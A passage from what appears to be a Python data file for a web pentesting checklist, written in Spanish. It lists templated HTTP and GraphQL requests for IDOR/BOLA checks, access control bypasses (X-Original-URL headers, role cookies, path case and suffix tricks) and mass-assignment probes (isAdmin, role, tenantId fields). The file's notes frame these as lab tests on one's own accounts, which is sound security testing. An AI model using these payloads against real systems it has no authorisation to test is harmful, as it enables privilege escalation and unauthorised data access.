            "Usar únicamente un endpoint de lectura existente; el body no deja de requerir autorización por objeto.",
            OWASP_BOLA,
        ),
        P(
            "Hijo de otro padre",
            "Cruzar parentId y childId de dos estructuras propias para probar la relación entre ambos.",
            "http",
            r"""GET /api/projects/{PROYECTO_A}/files/{ARCHIVO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}""",
            "El archivo B debe rechazarse aunque el proyecto A sea accesible. Una política solo sobre el padre es insuficiente.",
            OWASP_BOLA,
        ),
        P(
            "Archivo estático por identificador",
            "Pedir con A un archivo privado generado por B usando el nombre exacto conocido en el laboratorio.",
            "http",
            r"""GET /static/exports/{ARCHIVO_PRIVADO_B}.txt HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A}""",
            "Confirmar contenido propio de B. Un nombre no adivinable reduce descubrimiento, pero no establece autorización.",
            PS_IDOR,
        ),
        P(
            "ID codificado en Base64",
            "Si la app codifica un correo o ID, sustituirlo por la codificación de una cuenta propia B.",
            "python",
            r"""import base64
print(base64.urlsafe_b64encode(b"{EMAIL_PROPIO_B}").decode().rstrip("="))""",
            "Usar el valor en el parámetro real y comparar sesión A/B; codificar un ID no es un control de acceso.",
            PATT_IDOR,
        ),
        P(
            "ID derivado de hash",
            "Solo si el producto usa una transformación conocida, calcular el identificador de la cuenta propia B.",
            "python",
            r"""import hashlib
print(hashlib.md5(b"{EMAIL_PROPIO_B}").hexdigest())""",
            "No asumir MD5: comprobar algoritmo y normalización observados. El hash dificulta adivinar, pero la autorización sigue obligatoria.",
            PATT_IDOR,
        ),
        P(
            "Lista mixta de objetos",
            "Pedir una lista que contiene un objeto propio de A y otro creado por B.",
            "http",
            r"""POST /api/objects/batch-read HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"ids":["{ID_OBJETO_A}","{ID_OBJETO_B}"]}""",
            "Aplicar la política a cada elemento. El retorno de A no justifica incluir B; adaptar a un endpoint batch existente.",
            OWASP_BOLA,
        ),
        P(
            "Exportación por ID",
            "Verificar si la ruta de exportación protege igual que la vista de un documento propio de B.",
            "http",
            r"""GET /api/reports/{REPORTE_B}/export HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}""",
            "Si la vista rechaza y export entrega bytes de B, documentar ambos controles. No descargar datos ajenos.",
            OWASP_BOLA,
        ),
        P(
            "Método alternativo de lectura",
            "Cuando el producto ofrece POST y GET equivalentes, repetir la lectura de B con el método alternativo.",
            "http",
            r"""POST /api/objects/{ID_OBJETO_B}/view HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{}""",
            "Adaptar a una operación documentada o vista en tráfico; una ruta inventada con 404 no aporta señal.",
            PATT_IDOR,
        ),
        P(
            "Contaminación de parámetro ID",
            "Evaluar qué valor elige el backend cuando el mismo parámetro aparece dos veces.",
            "http",
            r"""GET /api/objects?object_id={ID_OBJETO_A}&object_id={ID_OBJETO_B} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}""",
            "Comparar ambos órdenes y observar cuál objeto se devuelve. Solo es IDOR si A recibe datos privados de B.",
            PATT_IDOR,
        ),
        P(
            "Nodo GraphQL con ID global",
            "Consultar bajo A el node ID conocido de un objeto propio de B.",
            "graphql",
            r"""query ObjetoDeB { node(id: "{GLOBAL_ID_OBJETO_B}") { id ... on Document { title } } }""",
            "Se aplica si el esquema expone node o un resolver equivalente; el ID global/Base64 no reemplaza autorización.",
            PS_GRAPHQL,
        ),
    ],
    "control-acceso": [
        P(
            "Función oculta en la UI",
            "Pedir directamente una ruta de lectura administrativa descubierta en el tráfico propio.",
            "http",
            r"""GET /api/admin/settings HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}""",
            "La ausencia de un enlace no protege la ruta. Confirmar contenido reservado, no un 200 genérico.",
            PS_ACCESS,
        ),
        P(
            "Sin sesión en ruta privilegiada",
            "Repetir la misma función observada sin credenciales.",
            "http",
            r"""GET /api/admin/settings HTTP/1.1
Host: {ORIGEN}
Accept: application/json""",
            "Separar autenticación ausente de fallo de rol. Un shell público de SPA no equivale a datos administrativos.",
            OWASP_BFLA,
        ),
        P(
            "Rol aportado por cookie",
            "Si el cliente envía una cookie de rol no firmada, cambiarla bajo la cuenta de bajo privilegio.",
            "http",
            r"""GET /api/admin/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_ROL_BAJO}; role=admin""",
            "Probar solo si la cookie existe en el flujo real; el servidor no debe basar la política en ese valor manipulable.",
            PS_ACCESS,
        ),
        P(
            "Rol aportado por query",
            "Si la app usa parámetros de vista o rol, comprobar que no sustituyen el rol de servidor.",
            "http",
            r"""GET /api/account?admin=true&role=admin HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_ROL_BAJO}""",
            "Comparar una acción reservada real; que cambie la apariencia del frontend no prueba elevación.",
            PS_ACCESS,
        ),
        P(
            "X-Original-URL",
            "Comparar la política del proxy sobre / con la ruta interna de lectura privilegiada.",
            "http",
            r"""GET / HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
X-Original-URL: /api/admin/settings""",
            "El riesgo existe si el backend sirve settings mientras la capa frontal autorizó solo /. Probar también sin el header.",
            PS_ACCESS,
        ),
        P(
            "X-Rewrite-URL",
            "Repetir la divergencia de ruta con el segundo header de reescritura documentado.",
            "http",
            r"""GET / HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
X-Rewrite-URL: /api/admin/settings""",
            "Una redirección o respuesta de / no basta; verificar que se ejecutó la ruta protegida real.",
            PS_ACCESS,
        ),
        P(
            "Cambio de método HTTP",
            "En una función propia y reversible, comparar la autorización de POST y GET si ambos son aceptados.",
            "http",
            r"""GET /api/admin/preview-report?report_id={REPORTE_PROPIO} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}""",
            "Usar una operación real de lectura o vista previa. El bypass requiere que un método alternativo alcance la misma función protegida.",
            PS_ACCESS,
        ),
        P(
            "Mayúsculas en ruta",
            "Cambiar solo la capitalización de una ruta privilegiada conocida.",
            "http",
            r"""GET /API/ADMIN/SETTINGS HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}""",
            "Comparar resolución del backend y decisión de autorización. Si devuelve otra ruta o 404, no hay bypass.",
            PS_ACCESS,
        ),
        P(
            "Barra final de ruta",
            "Comparar la misma función con y sin barra final.",
            "http",
            r"""GET /api/admin/settings/ HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}""",
            "La discrepancia importa cuando ambas variantes ejecutan la misma función pero una omite el control.",
            PS_ACCESS,
        ),
        P(
            "Sufijo en ruta",
            "En frameworks que admiten sufijos de ruta, probar una extensión inocua en función de lectura.",
            "http",
            r"""GET /api/admin/settings.json HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}""",
            "Aplica solo si el router resuelve el sufijo a la misma acción. No interpretar un archivo estático como bypass.",
            PS_ACCESS,
        ),
        P(
            "Paso final de flujo",
            "En un borrador propio, invocar el paso final sin completar la revisión autorizada previa.",
            "http",
            r"""POST /api/drafts/{BORRADOR_PROPIO}/confirm HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
Content-Type: application/json

{"confirmation":"{MARCADOR_PROPIO}"}""",
            "Usar un flujo reversible de laboratorio. Confirmar estado persistido y que faltaba una condición de autorización.",
            PS_ACCESS,
        ),
        P(
            "Referer como supuesta autorización",
            "En una subruta de lectura restringida, comparar con un Referer administrativo simulado.",
            "http",
            r"""GET /api/admin/reports/{REPORTE_PROPIO}/preview HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}
Referer: https://{ORIGEN}/admin""",
            "Referer es controlable y no acredita rol. Solo hay fallo si se devuelve contenido o función antes denegada.",
            PS_ACCESS,
        ),
        P(
            "Versión API alternativa",
            "Comparar la misma función en dos versiones que el producto mantenga activas.",
            "http",
            r"""GET /api/v1/admin/settings HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_ROL_BAJO}""",
            "Usar únicamente versiones descubiertas en la app. Verificar equivalencia funcional con la versión protegida.",
            OWASP_BFLA,
        ),
        P(
            "Mutación GraphQL de rol alto",
            "Invocar con rol bajo una mutación real de laboratorio diseñada para rol alto.",
            "graphql",
            r"""mutation VistaPrevia { adminPreviewReport(id: "{REPORTE_PROPIO}") { id status } }""",
            "El resolver debe aplicar política aunque la UI o la introspección escondan la operación; confirmar resultado efectivo.",
            PS_GRAPHQL,
        ),
    ],
    "mass-assignment": [
        P(
            "isAdmin en registro",
            "Añadir un atributo de privilegio a la creación de una cuenta propia de laboratorio.",
            "http",
            r"""POST /api/register HTTP/1.1
Host: {ORIGEN}
Content-Type: application/json

{"email":"{EMAIL_PROPIO_NUEVO}","password":"{PASSWORD_DE_LAB}","isAdmin":true}""",
            "Leer la cuenta creada y probar una función de rol alto. Eco del JSON sin persistencia ni privilegio no confirma fallo.",
            PATT_MASS,
        ),
        P(
            "role en actualización de perfil",
            "Añadir role a un PATCH legítimo de la cuenta propia de rol bajo.",
            "http",
            r"""PATCH /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"displayName":"prueba-controlada","role":"admin"}""",
            "Comprobar valor persistido y autorización efectiva. Restaurar displayName y no asumir que role es el campo real.",
            OWASP_MASS,
        ),
        P(
            "Estado de verificación",
            "Si la representación propia expone emailVerified o verified, comprobar que el cliente no pueda escribirlo.",
            "http",
            r"""PATCH /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"displayName":"prueba-controlada","emailVerified":true}""",
            "Verificar persistencia y una decisión que dependa de verificación; el simple reflejo del campo no demuestra bypass.",
            OWASP_API3,
        ),
        P(
            "ownerId en creación de objeto",
            "Crear un objeto propio de A indicando como dueño la cuenta propia B.",
            "http",
            r"""POST /api/projects HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"name":"proyecto-de-prueba","ownerId":"{ID_CUENTA_B}"}""",
            "Si se crea, consultar propiedad con A y B. La API debe derivar el dueño del principal o validar permiso de reasignación.",
            OWASP_MASS,
        ),
        P(
            "tenantId no editable",
            "En un tenant de prueba, agregar otro tenantId propio a una edición permitida.",
            "http",
            r"""PATCH /api/projects/{PROYECTO_A} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"name":"proyecto-de-prueba","tenantId":"{TENANT_PROPIO_B}"}""",
            "Confirmar si cambió la pertenencia real desde ambas cuentas; un identificador reflejado no prueba traspaso.",
            OWASP_API3,
        ),
        P(
            "Objeto anidado sensible",
            "Si el esquema admite un objeto user anidado, intentar incluir un atributo de rol no editable.",
            "json",
            r"""{"profile":{"displayName":"prueba-controlada"},"user":{"roles":["admin"]}}""",
            "Usar una estructura observada en el modelo real. Algunos binders enlazan propiedades anidadas aun si la UI no las envía.",
            OWASP_MASS,
        ),
        P(
            "Binding de formulario",
            "Comparar un campo extra en form-urlencoded cuando la API acepta formularios además de JSON.",
            "http",
            r"""POST /account/profile HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A}
Content-Type: application/x-www-form-urlencoded

displayName=prueba-controlada&isAdmin=true""",
            "El formato alterno puede pasar por otro binder. Confirmar persistencia y función de privilegio bajo la cuenta propia.",
            OWASP_MASS,
        ),
        P(
            "PUT de objeto completo",
            "En un recurso propio con PUT real, añadir una propiedad de solo lectura a la representación completa.",
            "http",
            r"""PUT /api/projects/{PROYECTO_A} HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_A}
Content-Type: application/json

{"id":"{PROYECTO_A}","name":"proyecto-de-prueba","createdBy":"{ID_CUENTA_B}"}""",
            "Probar solo si PUT conserva campos omitidos o en un objeto descartable propio; corroborar createdBy con GET posterior.",
            OWASP_API3,
        ),
        P(
            "Input de mutación GraphQL",
            "Agregar un atributo de control al input de una mutación de perfil propia.",
            "graphql",
            r"""mutation Editar($input: UpdateProfileInput!) { updateProfile(input: $input) { id role } }
variables: {"input":{"displayName":"prueba-controlada","role":"admin"}}""",
            "La sintaxis de variables se adapta al esquema observado. Si el tipo no declara role, rechazo de validación no informa sobre el binder.",
            PS_GRAPHQL,
        ),
    ],
}
